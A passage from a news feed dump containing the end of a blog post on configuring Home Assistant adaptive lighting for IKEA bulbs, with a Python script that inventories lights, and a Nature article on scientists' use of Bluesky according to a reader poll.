    <span>}</span>

    <span>response</span> <span>=</span> <span>requests</span><span>.</span><span>get</span><span>(</span><span>url</span><span>,</span> <span>headers</span><span>=</span><span>headers</span><span>)</span>
    <span>if</span> <span>response</span><span>.</span><span>status_code</span> <span>==</span> <span>200</span><span>:</span>
        <span>return</span> <span>response</span><span>.</span><span>json</span><span>()</span>
    <span>else</span><span>:</span>
        <span>print</span><span>(</span><span>f</span><span>"Error getting state for </span><span>{</span><span>entity_id</span><span>}</span><span>: </span><span>{</span><span>response</span><span>.</span><span>status_code</span><span>}</span><span>"</span><span>)</span>
        <span>return</span> <span>None</span>

<span>def</span> <span>get_all_lights</span><span>():</span>
    <span>"""Get all light entities from Home Assistant."""</span>
    <span>url</span> <span>=</span> <span>"http://localhost:8123/api/states"</span>
    <span>headers</span> <span>=</span> <span>{</span>
        <span>"Authorization"</span><span>:</span> <span>TOKEN</span><span>,</span>
        <span>"content-type"</span><span>:</span> <span>"application/json"</span><span>,</span>
    <span>}</span>

    <span>response</span> <span>=</span> <span>requests</span><span>.</span><span>get</span><span>(</span><span>url</span><span>,</span> <span>headers</span><span>=</span><span>headers</span><span>)</span>
    <span>if</span> <span>response</span><span>.</span><span>status_code</span> <span>==</span> <span>200</span><span>:</span>
        <span>entities</span> <span>=</span> <span>response</span><span>.</span><span>json</span><span>()</span>
        <span>lights</span> <span>=</span> <span>[]</span>
        <span>for</span> <span>entity</span> <span>in</span> <span>entities</span><span>:</span>
            <span>entity_id</span> <span>=</span> <span>entity</span><span>[</span><span>'entity_id'</span><span>]</span>
            <span>if</span> <span>entity_id</span><span>.</span><span>startswith</span><span>(</span><span>'light.'</span><span>):</span>
                <span>lights</span><span>.</span><span>append</span><span>(</span><span>entity_id</span><span>)</span>
        <span>return</span> <span>sorted</span><span>(</span><span>lights</span><span>)</span>
    <span>else</span><span>:</span>
        <span>print</span><span>(</span><span>f</span><span>"Error getting entities: </span><span>{</span><span>response</span><span>.</span><span>status_code</span><span>}</span><span>"</span><span>)</span>
        <span>return</span> <span>[]</span>

<span>def</span> <span>get_adaptive_switch_state</span><span>(</span><span>name</span><span>):</span>
    <span>switch_id</span> <span>=</span> <span>f</span><span>"switch.adaptive_lighting_</span><span>{</span><span>name</span><span>.</span><span>lower</span><span>()</span><span>}</span><span>"</span>
    <span>state</span> <span>=</span> <span>get_entity_state</span><span>(</span><span>switch_id</span><span>)</span>
    <span>if</span> <span>state</span><span>:</span>
        <span>print</span><span>(</span><span>f</span><span>"Adaptive switch </span><span>{</span><span>switch_id</span><span>}</span><span> full state: </span><span>{</span><span>json</span><span>.</span><span>dumps</span><span>(</span><span>state</span><span>,</span> <span>indent</span><span>=</span><span>2</span><span>)</span><span>}</span><span>"</span><span>)</span>
    <span>return</span> <span>state</span>

<span>def</span> <span>check_light_capabilities</span><span>(</span><span>light_attrs</span><span>,</span> <span>group_name</span><span>,</span> <span>light_id</span><span>,</span> <span>adaptive_config</span><span>):</span>
    <span>"""Check if light capabilities match adaptive lighting settings."""</span>
    <span>warnings</span> <span>=</span> <span>[]</span>

    <span># Check color temperature support
</span>    <span>if</span> <span>(</span><span>'color_temp_kelvin'</span> <span>in</span> <span>adaptive_config</span> <span>and</span>
        <span>'supported_color_modes'</span> <span>in</span> <span>light_attrs</span> <span>and</span>
        <span>'color_temp'</span> <span>not</span> <span>in</span> <span>light_attrs</span><span>[</span><span>'supported_color_modes'</span><span>]):</span>
        <span>warnings</span><span>.</span><span>append</span><span>(</span><span>f</span><span>"WARNING: </span><span>{</span><span>light_id</span><span>}</span><span> in </span><span>{</span><span>group_name</span><span>}</span><span> group doesn't support color temperature, "</span>
                      <span>f</span><span>"but adaptive lighting is trying to set it. Supported modes: </span><span>{</span><span>light_attrs</span><span>[</span><span>'supported_color_modes'</span><span>]</span><span>}</span><span>"</span><span>)</span>

    <span># Check brightness support
</span>    <span>if</span> <span>(</span><span>'brightness_pct'</span> <span>in</span> <span>adaptive_config</span> <span>and</span>
        <span>'supported_color_modes'</span> <span>in</span> <span>light_attrs</span> <span>and</span>
        <span>'brightness'</span> <span>not</span> <span>in</span> <span>light_attrs</span><span>[</span><span>'supported_color_modes'</span><span>]):</span>
        <span>warnings</span><span>.</span><span>append</span><span>(</span><span>f</span><span>"WARNING: </span><span>{</span><span>light_id</span><span>}</span><span> in </span><span>{</span><span>group_name</span><span>}</span><span> group doesn't support brightness, "</span>
                      <span>f</span><span>"but adaptive lighting is trying to set it. Supported modes: </span><span>{</span><span>light_attrs</span><span>[</span><span>'supported_color_modes'</span><span>]</span><span>}</span><span>"</span><span>)</span>

    <span>return</span> <span>warnings</span>

<span>def</span> <span>analyze_current_state</span><span>(</span><span>lights</span><span>,</span> <span>group_name</span><span>):</span>
    <span>print</span><span>(</span><span>f</span><span>"</span><span>\n</span><span>=== </span><span>{</span><span>group_name</span><span>}</span><span> Current State ==="</span><span>)</span>
    <span>print</span><span>(</span><span>f</span><span>"Analyzing at: </span><span>{</span><span>datetime</span><span>.</span><span>now</span><span>().</span><span>strftime</span><span>(</span><span>'%Y-%m-%d %H</span><span>:</span><span>%</span><span>M</span><span>:</span><span>%</span><span>S</span><span>')</span><span>}</span><span>"</span><span>)</span>

    <span># Get adaptive lighting switch state
</span>    <span>switch_state</span> <span>=</span> <span>get_adaptive_switch_state</span><span>(</span><span>group_name</span><span>)</span>
    <span>adaptive_config</span> <span>=</span> <span>{}</span>
    <span>if</span> <span>switch_state</span><span>:</span>
        <span>print</span><span>(</span><span>f</span><span>"Adaptive Lighting Switch: </span><span>{</span><span>switch_state</span><span>[</span><span>'state'</span><span>]</span><span>}</span><span>"</span><span>)</span>
        <span>print</span><span>(</span><span>f</span><span>"Last changed: </span><span>{</span><span>switch_state</span><span>.</span><span>get</span><span>(</span><span>'last_changed'</span><span>,</span> <span>'unknown'</span><span>)</span><span>}</span><span>"</span><span>)</span>
        <span>print</span><span>(</span><span>f</span><span>"Attributes: </span><span>{</span><span>json</span><span>.</span><span>dumps</span><span>(</span><span>switch_state</span><span>.</span><span>get</span><span>(</span><span>'attributes'</span><span>,</span> <span>{}</span><span>),</span> <span>indent</span><span>=</span><span>2</span><span>)</span><span>}</span><span>"</span><span>)</span>
        <span>adaptive_config</span> <span>=</span> <span>switch_state</span><span>.</span><span>get</span><span>(</span><span>'attributes'</span><span>,</span> <span>{})</span>
    <span>else</span><span>:</span>
        <span>print</span><span>(</span><span>"Adaptive Lighting Switch: Not found"</span><span>)</span>

    <span>now</span> <span>=</span> <span>datetime</span><span>.</span><span>now</span><span>()</span>
    <span>current_time</span> <span>=</span> <span>now</span><span>.</span><span>strftime</span><span>(</span><span>"%H:%M:%S"</span><span>)</span>
    <span>print</span><span>(</span><span>f</span><span>"Current Time: </span><span>{</span><span>current_time</span><span>}</span><span>"</span><span>)</span>

    <span># Track brightness statistics
</span>    <span>brightness_stats</span> <span>=</span> <span>{</span>
        <span>'min'</span><span>:</span> <span>float</span><span>(</span><span>'inf'</span><span>),</span>
        <span>'max'</span><span>:</span> <span>float</span><span>(</span><span>'-inf'</span><span>),</span>
        <span>'total'</span><span>:</span> <span>0</span><span>,</span>
        <span>'count'</span><span>:</span> <span>0</span>
    <span>}</span>

    <span># Group lights by capabilities
</span>    <span>light_types</span> <span>=</span> <span>{}</span>
    <span>capability_warnings</span> <span>=</span> <span>[]</span>

    <span>for</span> <span>light</span> <span>in</span> <span>lights</span><span>:</span>
        <span>state</span> <span>=</span> <span>get_entity_state</span><span>(</span><span>light</span><span>)</span>
        <span>if</span> <span>not</span> <span>state</span><span>:</span>
            <span>print</span><span>(</span><span>f</span><span>"</span><span>{</span><span>light</span><span>}</span><span>: Not found or offline"</span><span>)</span>
            <span>continue</span>

        <span>attrs</span> <span>=</span> <span>state</span><span>[</span><span>'attributes'</span><span>]</span>
        <span>status</span> <span>=</span> <span>[]</span>
        <span>capabilities</span> <span>=</span> <span>[]</span>

        <span># Check capabilities against adaptive lighting settings
</span>        <span>if</span> <span>adaptive_config</span><span>:</span>
            <span>warnings</span> <span>=</span> <span>check_light_capabilities</span><span>(</span><span>attrs</span><span>,</span> <span>group_name</span><span>,</span> <span>light</span><span>,</span> <span>adaptive_config</span><span>)</span>
            <span>capability_warnings</span><span>.</span><span>extend</span><span>(</span><span>warnings</span><span>)</span>

        <span># Basic state
</span>        <span>if</span> <span>state</span><span>[</span><span>'state'</span><span>]</span> <span>==</span> <span>'on'</span><span>:</span>
            <span>if</span> <span>'brightness'</span> <span>in</span> <span>attrs</span><span>:</span>
                <span>brightness_pct</span> <span>=</span> <span>round</span><span>((</span><span>attrs</span><span>[</span><span>'brightness'</span><span>]</span> <span>/</span> <span>255</span><span>)</span> <span>*</span> <span>100</span><span>)</span>
                <span>status</span><span>.</span><span>append</span><span>(</span><span>f</span><span>"brightness: </span><span>{</span><span>brightness_pct</span><span>}</span><span>%"</span><span>)</span>
                <span># Update brightness statistics
</span>                <span>brightness_stats</span><span>[</span><span>'min'</span><span>]</span> <span>=</span> <span>min</span><span>(</span><span>brightness_stats</span><span>[</span><span>'min'</span><span>],</span> <span>brightness_pct</span><span>)</span>
                <span>brightness_stats</span><span>[</span><span>'max'</span><span>]</span> <span>=</span> <span>max</span><span>(</span><span>brightness_stats</span><span>[</span><span>'max'</span><span>],</span> <span>brightness_pct</span><span>)</span>
                <span>brightness_stats</span><span>[</span><span>'total'</span><span>]</span> <span>+=</span> <span>brightness_pct</span>
                <span>brightness_stats</span><span>[</span><span>'count'</span><span>]</span> <span>+=</span> <span>1</span>

            <span>if</span> <span>'color_temp_kelvin'</span> <span>in</span> <span>attrs</span><span>:</span>
                <span>status</span><span>.</span><span>append</span><span>(</span><span>f</span><span>"temp: </span><span>{</span><span>attrs</span><span>[</span><span>'color_temp_kelvin'</span><span>]</span><span>}</span><span>K"</span><span>)</span>
            <span>elif</span> <span>'color_temp'</span> <span>in</span> <span>attrs</span><span>:</span>
                <span>status</span><span>.</span><span>append</span><span>(</span><span>f</span><span>"mired: </span><span>{</span><span>attrs</span><span>[</span><span>'color_temp'</span><span>]</span><span>}</span><span>"</span><span>)</span>

            <span>print</span><span>(</span><span>f</span><span>"</span><span>{</span><span>light</span><span>}</span><span>: ON - </span><span>{</span><span>', '</span><span>.</span><span>join</span><span>(</span><span>status</span><span>)</span><span>}</span><span>"</span><span>)</span>
        <span>else</span><span>:</span>
            <span>print</span><span>(</span><span>f</span><span>"</span><span>{</span><span>light</span><span>}</span><span>: OFF"</span><span>)</span>

        <span># Detailed capabilities
</span>        <span>if</span> <span>'supported_color_modes'</span> <span>in</span> <span>attrs</span><span>:</span>
            <span>capabilities</span><span>.</span><span>append</span><span>(</span><span>f</span><span>"modes:</span><span>{</span><span>attrs</span><span>[</span><span>'supported_color_modes'</span><span>]</span><span>}</span><span>"</span><span>)</span>
        <span>if</span> <span>'min_color_temp_kelvin'</span> <span>in</span> <span>attrs</span> <span>and</span> <span>'max_color_temp_kelvin'</span> <span>in</span> <span>attrs</span><span>:</span>
            <span>capabilities</span><span>.</span><span>append</span><span>(</span><span>f</span><span>"temp:</span><span>{</span><span>attrs</span><span>[</span><span>'min_color_temp_kelvin'</span><span>]</span><span>}</span><span>-</span><span>{</span><span>attrs</span><span>[</span><span>'max_color_temp_kelvin'</span><span>]</span><span>}</span><span>"</span><span>)</span>
        <span>if</span> <span>'supported_features'</span> <span>in</span> <span>attrs</span><span>:</span>
            <span>capabilities</span><span>.</span><span>append</span><span>(</span><span>f</span><span>"features:</span><span>{</span><span>attrs</span><span>[</span><span>'supported_features'</span><span>]</span><span>}</span><span>"</span><span>)</span>

        <span># Group by capabilities
</span>        <span>cap_key</span> <span>=</span> <span>','</span><span>.</span><span>join</span><span>(</span><span>sorted</span><span>(</span><span>capabilities</span><span>))</span>
        <span>if</span> <span>cap_key</span> <span>not</span> <span>in</span> <span>light_types</span><span>:</span>
            <span>light_types</span><span>[</span><span>cap_key</span><span>]</span> <span>=</span> <span>[]</span>
        <span>light_types</span><span>[</span><span>cap_key</span><span>].</span><span>append</span><span>(</span><span>light</span><span>)</span>

    <span># Print capability warnings
</span>    <span>if</span> <span>capability_warnings</span><span>:</span>
        <span>print</span><span>(</span><span>"</span><span>\n</span><span>=== Capability Warnings ==="</span><span>)</span>
        <span>for</span> <span>warning</span> <span>in</span> <span>capability_warnings</span><span>:</span>
            <span>print</span><span>(</span><span>warning</span><span>)</span>

    <span># Print brightness statistics
</span>    <span>if</span> <span>brightness_stats</span><span>[</span><span>'count'</span><span>]</span> <span>&gt;</span> <span>0</span><span>:</span>
        <span>print</span><span>(</span><span>f</span><span>"</span><span>\n</span><span>=== </span><span>{</span><span>group_name</span><span>}</span><span> Brightness Statistics ==="</span><span>)</span>
        <span>print</span><span>(</span><span>f</span><span>"Minimum brightness: </span><span>{</span><span>brightness_stats</span><span>[</span><span>'min'</span><span>]</span><span>}</span><span>%"</span><span>)</span>
        <span>print</span><span>(</span><span>f</span><span>"Maximum brightness: </span><span>{</span><span>brightness_stats</span><span>[</span><span>'max'</span><span>]</span><span>}</span><span>%"</span><span>)</span>
        <span>print</span><span>(</span><span>f</span><span>"Average brightness: </span><span>{</span><span>brightness_stats</span><span>[</span><span>'total'</span><span>]</span> <span>/</span> <span>brightness_stats</span><span>[</span><span>'count'</span><span>]</span><span>:</span><span>.</span><span>1</span><span>f</span><span>}</span><span>%"</span><span>)</span>
        <span>print</span><span>(</span><span>f</span><span>"Number of lights on: </span><span>{</span><span>brightness_stats</span><span>[</span><span>'count'</span><span>]</span><span>}</span><span>"</span><span>)</span>

    <span># Print summary of light types
</span>    <span>print</span><span>(</span><span>f</span><span>"</span><span>\n</span><span>=== </span><span>{</span><span>group_name</span><span>}</span><span> Light Types ==="</span><span>)</span>
    <span>for</span> <span>cap_key</span><span>,</span> <span>lights</span> <span>in</span> <span>light_types</span><span>.</span><span>items</span><span>():</span>
        <span>print</span><span>(</span><span>f</span><span>"</span><span>\n</span><span>Capabilities: </span><span>{</span><span>cap_key</span><span>}</span><span>"</span><span>)</span>
        <span>print</span><span>(</span><span>"Lights:"</span><span>)</span>
        <span>for</span> <span>light</span> <span>in</span> <span>lights</span><span>:</span>
            <span>print</span><span>(</span><span>f</span><span>"  - </span><span>{</span><span>light</span><span>}</span><span>"</span><span>)</span>

<span>def</span> <span>group_lights_by_capability</span><span>(</span><span>lights</span><span>):</span>
    <span>"""Group lights by their capabilities."""</span>
    <span>color_temp_lights</span> <span>=</span> <span>[]</span>
    <span>brightness_lights</span> <span>=</span> <span>[]</span>
    <span>other_lights</span> <span>=</span> <span>[]</span>

    <span>for</span> <span>light</span> <span>in</span> <span>lights</span><span>:</span>
        <span>state</span> <span>=</span> <span>get_entity_state</span><span>(</span><span>light</span><span>)</span>
        <span>if</span> <span>not</span> <span>state</span><span>:</span>
            <span>continue</span>

        <span>attrs</span> <span>=</span> <span>state</span><span>[</span><span>'attributes'</span><span>]</span>
        <span>if</span> <span>'supported_color_modes'</span> <span>in</span> <span>attrs</span><span>:</span>
            <span>if</span> <span>'color_temp'</span> <span>in</span> <span>attrs</span><span>[</span><span>'supported_color_modes'</span><span>]:</span>
                <span>color_temp_lights</span><span>.</span><span>append</span><span>(</span><span>light</span><span>)</span>
            <span>elif</span> <span>'brightness'</span> <span>in</span> <span>attrs</span><span>[</span><span>'supported_color_modes'</span><span>]:</span>
                <span>brightness_lights</span><span>.</span><span>append</span><span>(</span><span>light</span><span>)</span>
            <span>else</span><span>:</span>
                <span>other_lights</span><span>.</span><span>append</span><span>(</span><span>light</span><span>)</span>
        <span>else</span><span>:</span>
            <span>other_lights</span><span>.</span><span>append</span><span>(</span><span>light</span><span>)</span>

    <span>return</span> <span>{</span>
        <span>'Color Temperature'</span><span>:</span> <span>color_temp_lights</span><span>,</span>
        <span>'Brightness Only'</span><span>:</span> <span>brightness_lights</span><span>,</span>
        <span>'Other'</span><span>:</span> <span>other_lights</span>
    <span>}</span>

<span># Main execution
</span><span>if</span> <span>__name__</span> <span>==</span> <span>"__main__"</span><span>:</span>
    <span>all_lights</span> <span>=</span> <span>get_all_lights</span><span>()</span>
    <span>print</span><span>(</span><span>"</span><span>\n</span><span>=== All Lights Analysis ==="</span><span>)</span>
    <span>print</span><span>(</span><span>f</span><span>"Found </span><span>{</span><span>len</span><span>(</span><span>all_lights</span><span>)</span><span>}</span><span> lights in total"</span><span>)</span>

    <span># Group lights by capability
</span>    <span>grouped_lights</span> <span>=</span> <span>group_lights_by_capability</span><span>(</span><span>all_lights</span><span>)</span>

    <span># Analyze each capability group
</span>    <span>for</span> <span>group_name</span><span>,</span> <span>lights</span> <span>in</span> <span>grouped_lights</span><span>.</span><span>items</span><span>():</span>
        <span>if</span> <span>lights</span><span>:</span>  <span># Only analyze groups that have lights
</span>            <span>analyze_current_state</span><span>(</span><span>lights</span><span>,</span> <span>group_name</span><span>)</span>
</code></pre></div>

<ol>
  <li><strong>Run the custom parsing script</strong> on my Home Assistant setup to produce a detailed list of bulbs and their capabilities.</li>
  <li><strong>Feed the output</strong> into Cursor (in “agent mode” or similar), along with my old configuration.</li>
  <li><strong>Have Cursor generate</strong> the updated YAML for the new Adaptive Lighting system.</li>
</ol>

<p>It’s been a huge time-saver. Sure, I still do some manual debugging, but I also use Cursor to assist with the troubleshooting. For instance, if something breaks in Home Assistant, I feed the logs into Cursor and ask it to help me fix the error. It’s surprisingly effective.</p>

<h2 id="ikea-advice">IKEA Advice</h2>

<p>After extensive testing, I’ve optimized my adaptive lighting configurations for different IKEA bulb types. Here are my recommended settings that provide smooth transitions while maintaining good visibility throughout the day.</p>

<h3 id="dimmable-white-spectrum">Dimmable white spectrum</h3>

<p>For IKEA’s <em>LED bulb GU10 345 lumen, smart/wireless dimmable white spectrum</em> bulbs.</p>

<div><pre><code>  <span>-</span> <span>name</span><span>:</span> <span>adapt_brightness_standard_color_temp</span>
    <span>lights</span><span>:</span>
      <span>-</span> <span>light.light_1</span>
      <span>-</span> <span>light.light_2</span>
    <span>min_brightness</span><span>:</span> <span>50</span>
    <span>max_brightness</span><span>:</span> <span>100</span>
    <span>min_color_temp</span><span>:</span> <span>2202</span>
    <span>max_color_temp</span><span>:</span> <span>4000</span>
    <span>sleep_brightness</span><span>:</span> <span>1</span>
    <span>sleep_color_temp</span><span>:</span> <span>2202</span>
    <span>transition</span><span>:</span> <span>45</span>
    <span>interval</span><span>:</span> <span>90</span>
    <span>initial_transition</span><span>:</span> <span>1</span>
    <span>prefer_rgb_color</span><span>:</span> <span>false</span>
</code></pre></div>

<h3 id="dimmable-color-and-white-spectrum">Dimmable color and white spectrum</h3>

<p>For the <em>LED bulb E27 806 lumen, wireless dimmable color and white spectrum/globe opal white</em> bulbs.</p>

<div><pre><code>  <span>-</span> <span>name</span><span>:</span> <span>adapt_brightness_extended_color_temp</span>
    <span>lights</span><span>:</span>
      <span>-</span> <span>light.light_3</span>
      <span>-</span> <span>light.light_4</span>
    <span>min_brightness</span><span>:</span> <span>70</span>
    <span>max_brightness</span><span>:</span> <span>100</span>
    <span>min_color_temp</span><span>:</span> <span>2000</span>
    <span>max_color_temp</span><span>:</span> <span>6535</span>
    <span>sleep_brightness</span><span>:</span> <span>1</span>
    <span>sleep_color_temp</span><span>:</span> <span>2000</span>
    <span>transition</span><span>:</span> <span>45</span>
    <span>interval</span><span>:</span> <span>90</span>
    <span>initial_transition</span><span>:</span> <span>1</span>
    <span>prefer_rgb_color</span><span>:</span> <span>false</span>
</code></pre></div>

<h3 id="dimmable-warm-white">Dimmable warm white</h3>

<p>For the basic <em>LED bulb GU10 345 lumen, smart/wireless dimmable warm white</em> bulbs.</p>

<div><pre><code>  <span>-</span> <span>name</span><span>:</span> <span>adapt_brightness_brightness_only</span>
    <span>lights</span><span>:</span>
      <span>-</span> <span>light.light_5</span>
      <span>-</span> <span>light.light_6</span>
    <span>min_brightness</span><span>:</span> <span>50</span>
    <span>max_brightness</span><span>:</span> <span>100</span>
    <span>sleep_brightness</span><span>:</span> <span>1</span>
    <span>transition</span><span>:</span> <span>45</span>
    <span>interval</span><span>:</span> <span>90</span>
    <span>initial_transition</span><span>:</span> <span>1</span>
</code></pre></div>

<h2 id="next-steps-smart-trvs">Next Steps: Smart TRVs</h2>

<p>Now that the lighting is running smoothly, my next big smart home project is upgrading all my radiators with Zigbee-based smart TRVs (thermostatic radiator valves). The goal is to have each room in my home maintain an optimal temperature by reading from the central Nest thermostat. In older British homes like mine, temperature control isn’t very granular, so having each radiator adjust itself is a major comfort and efficiency boost.</p>

<p>I’ve already purchased <a href="https://s.click.aliexpress.com/e/_EzwaYAM">these TRVs</a> but haven’t had time to configure them yet. My plan is:</p>

<ol>
  <li><strong>Pair the TRVs</strong> to my Zigbee network.</li>
  <li><strong>Pull temperature data</strong> from my Nest thermostat (the main sensor).</li>
  <li><strong>Set up automations</strong> in Home Assistant so that each room’s radiator valve opens or closes based on its own target temperature.</li>
</ol>

<p>I’m hoping this will help solve the typical British house problem: some rooms end up too warm, while others are never warm enough. With per-room heating control, it should be far more balanced and efficient.</p>

<h2 id="conclusion-so-far">Conclusion (So Far)</h2>

<p>That’s where my Home Assistant journey sits at the moment. I’m thrilled with how the adaptive lighting is working, especially now that I’ve harnessed an AI coding assistant to manage the complexity of my YAML files. The next challenge, smart radiator valves, will hopefully bring my home’s temperature control on par with my lighting automation.</p>


        <i>Found an error or typo? File PR against <a href="https://github.com/vpetersson/vpetersson.com/tree/master/_posts/2025-01-22-how-i-use-home-assistant-in-2025.md" rel="nofollow">this file</a>.</i>
    </article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Bluesky's science takeover: 70% of Nature poll respondents use platform (108 pts)]]></title>
            <link>https://www.nature.com/articles/d41586-025-00177-1</link>
            <guid>42813316</guid>
            <pubDate>Fri, 24 Jan 2025 14:27:47 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.nature.com/articles/d41586-025-00177-1">https://www.nature.com/articles/d41586-025-00177-1</a>, See on <a href="https://news.ycombinator.com/item?id=42813316">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-test="access-teaser"> <figure><picture><source type="image/webp" srcset="https://media.nature.com/lw767/magazine-assets/d41586-025-00177-1/d41586-025-00177-1_50491424.jpg?as=webp 767w, https://media.nature.com/lw319/magazine-assets/d41586-025-00177-1/d41586-025-00177-1_50491424.jpg?as=webp 319w" sizes="(max-width: 319px) 319px, (min-width: 1023px) 100vw,  767px"><img alt="The silhouettes of several people using digital devices against the blue backdrop of the Bluesky logo." loading="lazy" src="https://media.nature.com/lw767/magazine-assets/d41586-025-00177-1/d41586-025-00177-1_50491424.jpg"><figcaption><p><span>Social-media platform Bluesky has more than 27 million users.</span><span>Credit: Peter Kováč/Alamy</span></p></figcaption></picture></figure><p>Seventy per cent of <i>Nature</i> readers who responded to an <a href="https://www.nature.com/articles/d41586-025-00037-y" data-track="click" data-label="https://www.nature.com/articles/d41586-025-00037-y" data-track-category="body text link">online poll</a> are using the social-media platform Bluesky, which works a lot like X (formerly Twitter) and whose popularity has soared in recent months, in particular since the <a href="https://www.nature.com/articles/d41586-024-03635-4" data-track="click" data-label="https://www.nature.com/articles/d41586-024-03635-4" data-track-category="body text link">November US election</a>.</p><p>Although the survey is not statistically representative of <i>Nature</i> readers or the scientific community at large, it echoes <a href="https://www.nature.com/articles/d41586-024-03784-6" data-track="click" data-label="https://www.nature.com/articles/d41586-024-03784-6" data-track-category="body text link">recent enthusiasm for Bluesky</a> among researchers and <a href="https://www.nature.com/articles/d41586-023-02554-0" data-track="click" data-label="https://www.nature.com/articles/d41586-023-02554-0" data-track-category="body text link">disillusionment with X</a>. Of roughly 5,300 readers who responded to a question about X, 53% said they used to be on X but have now left (see ‘Mass exodus’).</p><figure><picture><source type="image/webp" srcset="https://media.nature.com/lw767/magazine-assets/d41586-025-00177-1/d41586-025-00177-1_50509360.png?as=webp 767w, https://media.nature.com/lw319/magazine-assets/d41586-025-00177-1/d41586-025-00177-1_50509360.png?as=webp 319w" sizes="(max-width: 319px) 319px, (min-width: 1023px) 100vw,  767px"><img alt="MASS EXODUS. Graphic shows 53% of respondents to a Nature survey said they used to be on the platform X but have now left." loading="lazy" src="https://media.nature.com/lw767/magazine-assets/d41586-025-00177-1/d41586-025-00177-1_50509360.png"><figcaption><p><span>Source: L. Balduf <i>et al</i>. Preprint at arXiv <a href="https://doi.org/10.48550/arXiv.2501.11605" data-track="click" data-label="https://doi.org/10.48550/arXiv.2501.11605" data-track-category="body text link">https://doi.org/10.48550/arXiv.2501.11605</a> (2025)</span></p></figcaption></picture></figure><p>“Bluesky is much better for science. There is much less toxicity, misinformation, and distractions,” wrote one respondent. “My feed is almost entirely scientists and I actually get updates on research that is relevant and timely,” wrote another.</p><p>Bluesky now has more than 27 million users and is broadly similar in functionality and user experience to X, which for a long time was a go-to platform for scientists to discuss and disseminate their work. X fell out of favour with some after entrepreneur <a href="https://www.nature.com/articles/d41586-024-04098-3" data-track="click" data-label="https://www.nature.com/articles/d41586-024-04098-3" data-track-category="body text link">Elon Musk</a> purchased the tool in October 2022.</p><p>In <i>Nature</i>’s survey, 55% of respondents to the question ‘What do you use Bluesky for?’ said it was a mix of three research-related activities: to connect with other scientists, keep up to date with other research or researchers, and promote their own research (see ‘Online connections’).</p><figure><picture><source type="image/webp" srcset="https://media.nature.com/lw767/magazine-assets/d41586-025-00177-1/d41586-025-00177-1_50508222.png?as=webp 767w, https://media.nature.com/lw319/magazine-assets/d41586-025-00177-1/d41586-025-00177-1_50508222.png?as=webp 319w" sizes="(max-width: 319px) 319px, (min-width: 1023px) 100vw,  767px"><img alt="ONLINE CONNECTIONS. Graphic shows 55% of respondents to Nature's poll said they used Bluesky to to connect with other scientists, keep up to date with other research or researchers and promote their own research." loading="lazy" src="https://media.nature.com/lw767/magazine-assets/d41586-025-00177-1/d41586-025-00177-1_50508222.png"><figcaption><p><span>Source: L. Balduf <i>et al</i>. Preprint at arXiv <a href="https://doi.org/10.48550/arXiv.2501.11605" data-track="click" data-label="https://doi.org/10.48550/arXiv.2501.11605" data-track-category="body text link">https://doi.org/10.48550/arXiv.2501.11605</a> (2025)</span></p></figcaption></picture></figure><p>In total, almost 6,000 readers responded to <i>Nature’s</i> poll, which ran from 14 to 17 January 2025. We solicited responses on the <a href="https://www.nature.com/" data-track="click" data-label="https://www.nature.com/" data-track-category="body text link"><i>Nature</i> website,</a> on social media and in the <a href="https://www.nature.com/briefing/signup" data-track="click" data-label="https://www.nature.com/briefing/signup" data-track-category="body text link">Nature Briefing</a>, an e-mail newsletter. Of the almost 5,000 respondents who answered a question about their work, 85% — or 3,970 — said that they were working scientists. A similar number responded to a question about their field of study: 38% said they worked in biological sciences, 11% in computing or information sciences, 9% in physical sciences and 9% in environmental sciences. Answers came from scientists in 84 countries or regions, with the most coming from the United States (33%), followed by the United Kingdom (15%) and Germany (12%). </p><h2>Positive vibes</h2><p>Thousands of survey respondents wrote expressively about how they think Bluesky stacks up against X. “Bluesky compares beautifully so far. More civil and informed conversations,” wrote one. Other positive terms that respondents used to contrast the platform with X included more pleasant, more supportive, friendlier, kinder, nicer, more collegial, uplifting, more peaceful and safer.</p><p>A sense of safety is particularly valuable to researchers who teach or lead teams. “I feel that I can recommend it to students and trainees. I can’t do that for X, it is not a safe learning space,” wrote one respondent. </p><p>Some wrote that Bluesky is a better forum than X for discussing science, because debate there is more measured and more focused, with less hostility. “I find it much less antagonistic to science,” said one respondent.</p><p>But with less heated debate and fewer users than X, some find Bluesky boring. That could change if it continues to attract new users at pace (see ‘Bluesky growth’). “Was pretty sleepy until November 2024. Now there seems to be enough critical mass of researchers in my field to find new research and connect again,” wrote one respondent.</p><figure><picture><source type="image/webp" srcset="https://media.nature.com/lw767/magazine-assets/d41586-025-00177-1/d41586-025-00177-1_50509076.png?as=webp 767w, https://media.nature.com/lw319/magazine-assets/d41586-025-00177-1/d41586-025-00177-1_50509076.png?as=webp 319w" sizes="(max-width: 319px) 319px, (min-width: 1023px) 100vw,  767px"><img alt="BLUESKY GROWTH. Chart shows the rapid increase in the number of Bluesky users since mid-2024." loading="lazy" src="https://media.nature.com/lw767/magazine-assets/d41586-025-00177-1/d41586-025-00177-1_50509076.png"><figcaption><p><span>Source: L. Balduf <i>et al</i>. Preprint at arXiv <a href="https://doi.org/10.48550/arXiv.2501.11605" data-track="click" data-label="https://doi.org/10.48550/arXiv.2501.11605" data-track-category="body text link">https://doi.org/10.48550/arXiv.2501.11605</a> (2025)</span></p></figcaption></picture></figure><h2>Fewer fascists?</h2><p>Other marks in Bluesky’s favour noted by survey respondents include the perception that there are fewer “Nazis” on the platform than on X, and less racism; that it is not owned or deemed to be influenced by Musk; and that it does not host advertisements.</p><p>X could not be reached for comment on these criticisms before this article was published.</p><p>Not all <i>Nature</i> readers love Bluesky. One criticism that emerged in the survey responses contends that it is a leftwing echo chamber. “Bluesky is full of woke crazy people who will threaten you with violence if you disagree with the liberal narrative,” said one respondent. </p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Little Snitch feature nobody knows about (121 pts)]]></title>
            <link>https://lapcatsoftware.com/articles/2025/1/6.html</link>
            <guid>42813231</guid>
            <pubDate>Fri, 24 Jan 2025 14:18:20 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://lapcatsoftware.com/articles/2025/1/6.html">https://lapcatsoftware.com/articles/2025/1/6.html</a>, See on <a href="https://news.ycombinator.com/item?id=42813231">Hacker News</a></p>
<div id="readability-page-1" class="page">
<nav>
Previous: <a href="https://lapcatsoftware.com/articles/2025/1/5.html">New secure note on macOS Sequoia</a>
<br><a href="https://lapcatsoftware.com/articles/index.html" title="The Desolation of Blog">Articles index</a></nav>
